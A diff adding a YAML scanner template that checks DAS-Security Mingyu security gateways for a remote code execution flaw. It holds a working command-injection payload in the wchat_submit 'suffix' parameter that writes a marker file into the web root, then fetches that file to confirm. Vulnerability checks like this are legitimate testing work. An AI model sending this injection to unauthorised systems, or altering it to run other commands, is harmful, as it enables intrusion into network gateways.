@@ -1,0 +1,15 @@
+name: 安恒-明御安全网关-wchat_submit-RCE
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: GET
+    path: /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60echo%20Rscan_test%60%20|tee%20/usr/local/webui/sslvpn/Rscan.txt|ls
+    expression:
+      status: 200
+  - method: GET
+    path: /sslvpn/Rscan.txt
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
